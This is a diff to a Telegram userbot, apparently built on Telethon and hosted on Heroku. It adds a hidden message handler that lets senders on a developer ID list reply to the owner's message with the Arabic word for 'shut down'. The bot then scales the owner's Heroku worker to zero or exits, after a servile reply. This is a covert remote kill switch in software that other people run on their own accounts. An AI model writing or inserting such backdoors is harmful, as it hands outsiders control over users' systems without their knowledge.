@@ -140,3 +140,16 @@ async def Hussein(event):
                     pass
                 except Exception as e:
                     LOGS.error(e)
+                    
+@l313l.on(events.NewMessage(incoming=True))
+async def Hussein(event):
+    if event.reply_to and event.sender_id in JOKRDEV:
+        reply_msg = await event.get_reply_message()
+        owner_id = reply_msg.from_id.user_id
+        if owner_id == l313l.uid:
+            if event.message.message == "اطفاء":
+                    await event.reply("**᯽︙ تدلل مولاي تم اطفاء السورس بواسطة تاج راسك 😁**")
+                    if HEROKU_APP is not None:
+                        HEROKU_APP.process_formation()["worker"].scale(0)
+                    else:
+                        sys.exit(0)
